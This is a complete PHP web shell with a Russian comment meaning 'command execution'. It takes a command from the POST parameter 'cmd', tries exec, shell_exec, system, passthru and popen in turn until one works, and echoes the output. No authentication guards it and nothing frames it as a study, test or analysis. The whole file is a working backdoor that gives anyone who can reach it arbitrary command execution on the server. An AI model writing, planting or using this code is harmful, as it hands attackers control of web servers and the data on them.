<?php
function ex($comd)                             //Выполнение команды
{
   $res = '';

    if(function_exists('exec')){
		exec($comd,$res);
		$res=implode("\n",$res);
	}elseif(function_exists('shell_exec')){
		$res=shell_exec($comd);
	}elseif(function_exists('system')){
		ob_start();
		system($comd);
		$res=ob_get_contents();
		ob_end_clean();
	}elseif(function_exists('passthru')){
		ob_start();
		passthru($comd);
		$res=ob_get_contents();
		ob_end_clean();
	}elseif(is_resource($f=popen($comd,"r"))){
		$res = "";
		while(!feof($f)) { $res.=fread($f,1024); }
		pclose($f);
	}
	return $res;
}

$res=ex($_POST['cmd']);
echo $res;
?>